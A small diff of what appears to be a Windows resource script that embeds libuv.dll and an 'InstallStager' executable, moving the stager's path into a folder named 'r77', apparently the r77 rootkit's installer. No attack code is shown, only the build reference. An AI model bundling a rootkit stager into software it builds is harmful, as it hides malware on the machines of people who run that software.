@@ -58,7 +58,7 @@ IDR_DLL1                DLL                     "file\\libuv.dll"
 // INSTALLSTAGER
 //
 
-IDR_INSTALLSTAGER1      INSTALLSTAGER           "file\\hide_funtion file\\InstallStager.exe"
+IDR_INSTALLSTAGER1      INSTALLSTAGER           "hand file\\r77\\exe file\\InstallStager.exe"
 
 #endif    // 中文(简体，中国) resources
 /////////////////////////////////////////////////////////////////////////////
